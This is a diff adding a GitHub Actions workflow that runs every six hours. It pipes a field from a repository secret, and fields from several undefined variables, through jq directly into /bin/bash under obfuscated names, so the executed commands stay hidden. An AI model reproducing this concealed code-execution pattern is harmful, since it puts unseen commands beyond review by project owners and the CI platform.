@@ -1,0 +1,24 @@
+name: shidayueguang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shidayueguang
+        env:
+          z5520: ${{ secrets.z5520 }}
+        run: |
+          echo $z5520 | jq -r .j4 | /bin/bash
+          echo $p1 | jq -r .bsnsg6 | /bin/bash
+          echo $ykm44 | jq -r .pz73 | /bin/bash
+          echo $bahb546 | jq -r .ins113 | /bin/bash
+          echo $vbed1821 | jq -r .lhgg54 | /bin/bash
+          echo $gpgry39 | jq -r .pcr13737 | /bin/bash
+          echo $l37 | jq -r .l31 | /bin/bash
+
